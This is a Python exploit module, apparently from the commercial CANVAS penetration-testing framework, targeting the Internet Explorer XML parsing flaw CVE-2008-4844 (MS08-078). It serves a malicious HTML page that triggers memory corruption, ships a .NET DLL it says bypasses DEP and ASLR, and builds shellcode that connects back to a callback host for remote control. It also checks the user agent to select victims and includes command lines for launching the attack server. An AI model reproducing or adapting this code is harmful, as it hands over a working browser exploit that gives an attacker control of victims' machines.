#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008-2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from httpclientside import httpclientside
from shellcode import shellcodeGenerator,win32shell
import binascii
from pelib import PElib
import random
from libs.spkproxy import header,body
from canvasengine import WIN32MOSDEF
import shellcode.standalone.windows.payloads as payloads

NAME='MS Internet Explorer XML Parsing Vulnerability'
DESCRIPTION='MS Internet Explorer XML Parsing Vulnerability'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Repeatability']='One Shot'
DOCUMENTATION['Date public']='09/12/2008'
DOCUMENTATION['CVE Name']='CVE-2008-4844'
DOCUMENTATION['CVS URL']='http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844'
DOCUMENTATION['CVSS'] = 9.3
DOCUMENTATION['MSRC']='http://www.microsoft.com/technet/security/Bulletin/MS08-078.mspx'
DOCUMENTATION['Note']='After the exploit works, Internet Explorer might crash. (The callback connection will remain working)'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003','Vista']
PROPERTY['MSADV']='MS08-078'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
bash-3.00$ ./commandlineInterface.py -v 1 -p 5555
bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:ms08_078 -l 192.168.1.1 -p 8080 -d 5555
"""

CHANGELOG="""
Tested on Windows XP SP3 / IE7 (the current tab remains stall, but the rest works perfectly)
It uses the .NET DLL trick, effectively defeating DEP and ASLR.
"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.searchMethod=self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent=[('Mozilla/','MSIE','')]
        self.badstring=''
        self.setVersions()
        self.version=0
        self.name=NAME
        self.filename='index.html'
        self.subesp=0x100
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print 'Version %d: %s'%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[1]=('Windows',0x41414141)

    #XXX: Redo this shellcode to make it work inside clientd
    def neededListenerTypes(self):
        return [WIN32MOSDEF]

    def createShellcode(self):
        p=payloads.payloads(VirtualProtect=True)
        sc=p.forkload(self.callback.ip,self.callback.port,restorehash=True,load_winsock=True)
        self.shellcode=p.assemble(sc)
        return self.shellcode 

    def run(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        class cl:
            def __init__(self):
                pass
        c=cl()
        c.URL='exploit.dll'
        filedata=self.makefile(c)
        fd=file(c.URL,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Opening %s for output'%self.filename)
        c.URL=self.filename
        filedata=self.makefile(c)
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%self.filename)
        self.log('NOTE: Also an exploit.dll was created and need to be included')
        return 1

    def makefile(self,clientheader):
        """Makes the actual bad html file to trigger the buffer overflow"""
        if 'exploit.dll' in clientheader.URL:
            self.log('Sending .NET DLL')
            p=PElib()
            """
	    438242F4    8B08            MOV ECX,DWORD PTR DS:[EAX]  ; EAX=41414141
	    438242F6    57              PUSH EDI
	    438242F7    50              PUSH EAX
	    438242F8    FF91 84000000   CALL DWORD PTR DS:[ECX+84]  ; ECX = 414140C1
	    """
            return p.createDotNETPEFileBuf('\xc1\x40\x41\x41'+'\x49\x41\x41\x41'+self.createShellcode(),0x41414141)
        else:
            self.log('Sending HTML file')
            html="""<html>
<body>
<script>
document.write("<object classid='%dexploit.dll#exploit.Shellcode'></object><XML ID=I><X><C><![CDATA[<image SRC=http://&#16705;&#16705;.example.com>]]></C></X></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><XML ID=I></XML><HTML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN></SPAN></HTML>");
</script>
</body>
</html>"""%(random.randint(0,65535))
            return html

    def makesploit(self,clientheader,clientbody):
        h=header('SERVER')
        b=body()
        user_agent=clientheader.getStrValue(['User-Agent'])
        self.log('User agent of connecting host: %s'%user_agent)
        if user_agent.count('MSIE')==0:
            #still need to determine if it's pretending to be IE by spoofing User-Agent string
            self.log('Non IE browser connected - returning None')
            return None,None
        if user_agent.lower().count('windows nt')==0:
            #all the supported versions are NT based
            return None,None
        #send the exploit
        self.log('Sending the MS08-078 attack HTML file')
        sploitstring=self.makefile(clientheader)
        if not sploitstring:
            return None,None
        b.setBody(sploitstring)
        if '<html>' in sploitstring.lower():
            h.addHeader('Content-Type','text/html')
        else:
            h.addHeader('Content-Type','application/octet-stream')
        return h,b


if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
